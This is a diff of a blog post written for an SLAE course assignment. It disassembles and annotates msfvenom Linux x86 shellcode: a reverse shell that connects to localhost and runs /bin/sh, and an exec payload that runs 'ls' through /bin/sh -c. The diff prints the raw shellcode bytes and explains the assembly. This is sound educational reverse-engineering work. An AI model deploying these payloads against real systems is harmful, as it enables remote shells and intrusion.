@@ -17,7 +17,12 @@ tags:
 
 ## Introduction
 
-The 5th assignment for SLAE is to analyze 3 msfvenom payloads. For this excercise, I thought I would revisit some semi-familiar code in the `linux/x86/shell_bind_tcp`, `linux/x86/shell_reverse_tcp`, and `linux/x86/exec` payloads. My primary reason for doing this is because we've written similar code already and I want to see how the pros do it at Metasploit and see if we can pick up some new tricks/efficiencies. 
+The 5th assignment for SLAE is to analyze 3 msfvenom payloads. For this excercise, I thought I would revisit some semi-familiar code in the:
++ `linux/x86/shell_bind_tcp`,
++ `linux/x86/shell_reverse_tcp`, and
++ and `linux/x86/exec` payloads. 
+
+My primary reason for doing this is because we've written similar code already and I want to see how the pros do it when contributing to Metasploit and see if we can pick up some new tricks/efficiencies. 
 
 ## Analyzing Shellcode #1 (`linux/x86/shell_bind_tcp`)
 
@@ -283,8 +288,6 @@ Run our ndisasm command:
 root@kali:~# echo -ne "\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd\x80\x93\x59\xb0\x3f\xcd\x80\x49\x79\xf9\x68\x7f\x00\x00\x01\x68\x02\x00\x15\xb3\x89\xe1\xb0\x66\x50\x51\x53\xb3\x03\x89\xe1\xcd\x80\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89\xe1\xb0\x0b\xcd\x80" |ndisasm -u -
 ```
 
-This time we won't `awk` out just the assembly since last time it made things harder without as much context. 
-
 Output:
 ```terminal_session
 00000000  31DB              xor ebx,ebx
@@ -321,6 +324,45 @@ Output:
 0000003E  89E1              mov ecx,esp
 00000040  B00B              mov al,0xb
 00000042  CD80              int 0x80
+```
+
+Let's use cut out the assembly with by piping the output to `awk` with: `echo -ne "<SHELLCODE>" | ndisasm -u -| awk '{print $3,$4,$5,$6}'` and paste it into nasm syntax highlighter. 
+
+```nasm
+xor ebx,ebx  
+mul ebx  
+push ebx  
+inc ebx  
+push ebx  
+push byte +0x2 
+mov ecx,esp  
+mov al,0x66  
+int 0x80  
+xchg eax,ebx  
+pop ecx  
+mov al,0x3f  
+int 0x80  
+dec ecx  
+jns 0x11  
+push dword 0x100007f 
+push dword 0xb3150002 
+mov ecx,esp  
+mov al,0x66  
+push eax  
+push ecx  
+push ebx  
+mov bl,0x3  
+mov ecx,esp  
+int 0x80  
+push edx  
+push dword 0x68732f6e 
+push dword 0x69622f2f 
+mov ebx,esp  
+push edx  
+push ebx  
+mov ecx,esp  
+mov al,0xb  
+int 0x80
 ```
 
 Alright, let's analyze this code. As you have probably already figured out, they're using `socketcall()` again. This should be familiar territory for us at this point. 
@@ -399,8 +441,109 @@ All in all there were the same lessons learned. It emphasizes more succicnt asse
 
 ## Analyzing Shellcode #3 (`linux/x86/exec`)
 
+For this payload you have specify a `CMD` parameter which will represent an arbitrary command you want to run on the victim host. Let's choose `ls` as our command and see how the folks contributing to Metasploit pull this off with their shellcode. 
 
+```terminal_session
+root@kali:~# msfvenom -p linux/x86/exec CMD=ls -f c
+[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
+[-] No arch selected, selecting arch: x86 from the payload
+No encoder or badchars specified, outputting raw payload
+Payload size: 38 bytes
+Final size of c file: 185 bytes
+unsigned char buf[] = 
+"\x6a\x0b\x58\x99\x52\x66\x68\x2d\x63\x89\xe7\x68\x2f\x73\x68"
+"\x00\x68\x2f\x62\x69\x6e\x89\xe3\x52\xe8\x03\x00\x00\x00\x6c"
+"\x73\x00\x57\x53\x89\xe1\xcd\x80";
+```
 
+Let's plug the shellcode into ndisasm and dump the assembly code with the following command: 
+```terminal_session
+root@kali:~# echo -ne "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x63\x89\xe7\x68\x2f\x73\x68\x00\x68\x2f\x62\x69\x6e\x89\xe3\x52\xe8\x03\x00\x00\x00\x6c\x73\x00\x57\x53\x89\xe1\xcd\x80" | ndisasm -u -
+```
+
+Output:
+```terminal_session
+00000000  6A0B              push byte +0xb
+00000002  58                pop eax
+00000003  99                cdq
+00000004  52                push edx
+00000005  66682D63          push word 0x632d
+00000009  89E7              mov edi,esp
+0000000B  682F736800        push dword 0x68732f
+00000010  682F62696E        push dword 0x6e69622f
+00000015  89E3              mov ebx,esp
+00000017  52                push edx
+00000018  E803000000        call 0x20
+0000001D  6C                insb
+0000001E  7300              jnc 0x20
+00000020  57                push edi
+00000021  53                push ebx
+00000022  89E1              mov ecx,esp
+00000024  CD80              int 0x80
+```
+
+Using our aforementioned `awk` command to just retrieve the assembly for syntax highlighting.
+```nasm
+push byte +0xb
+pop eax 
+cdq  
+push edx 
+push word 0x632d
+mov edi,esp 
+push dword 0x68732f
+push dword 0x6e69622f
+mov ebx,esp 
+push edx 
+call 0x20 
+insb  
+jnc 0x20 
+push edi 
+push ebx 
+mov ecx,esp 
+int 0x80 
+```
+
+Ok, let's jump into some analysis. Right off the bat we see they are using `execve` by placing `0xb` into `eax`. Let's look at the next section of code. 
+
+```nasm
+cdq                       ; this will clear $edx to zero, a clever new trick for us
+push edx                  ; push a null onto the stack
+push word 0x632d          ; pushing the string for '-c' onto the stack which will be used along with '/bin/sh' to specify our 'ls' cmd
+mov edi,esp               ; store a stack pointer to our arg structure into $edi
+push dword 0x68732f        
+push dword 0x6e69622f     ; pushing '/bin/sh' onto the stack
+mov ebx,esp               ; storing this stack pointer to this arg structure in ebx
+push edx                  ; push null onto stack
+```
+
+This is relatively familiar to us so far. Let's go deeper.
+
+```nasm
+call 0x20         ; call here to the instruction at 0x20 which is 'push edi' which we stored our stack pointer in
+insb              
+jnc 0x20
+```
+
+`insb` and `jnc 0x20` are very interesting. Let's examine the value stored there from our ndisasm ouput:
++ `0000001D  6C                insb
++ `0000001E  7300              jnc 0x20`
+
+A hex converter will tell us that `6C` is `l` while `73` is `s`. So this is how the program get's `ls` onto the stack followed by the `00` terminator. A `call` opcode will store the address of the next command onto the stack, so we've successfully placed the address of our command onto the stack. This is a very cool trick we can begin to incorporate into our shellcode. 
+
+Let's finish up. 
+
+```nasm
+push edi        ; pushes $edi onto the stack which stores the address of '-c' remember
+push ebx        ; pushes address of '/bin/sh' onto stack
+mov ecx,esp     ; finally, this will move into $ecx the stack pointer which will complete the entire command '/bin/sh -c ls'
+int 0x80 
+```
+
+### Lessons Learned
+
+Using a call to store instruction addresses on the stack is a very cool trick that we were familiar with from writing `JMP CALL POP` shellcode, but I needed reminding that it is valuable outside of decoder stub construction!
+
+This was a great excercise and it was very fun to look at how the shellcode we use everyday generated from `msfvenom` actually works. 
 
 ## Github
 
@@ -409,7 +552,7 @@ This blog post has been created for completing the requirements of the SecurityT
 
 Student ID: SLAE-1458
 
-You can find all of the code used in this blog post [here.](https://github.com/h0mbre/SLAE/tree/master/Assignment4)
+You can find all of the code used in this blog post [here.](https://github.com/h0mbre/SLAE/tree/master/Assignment5)
 
 
 
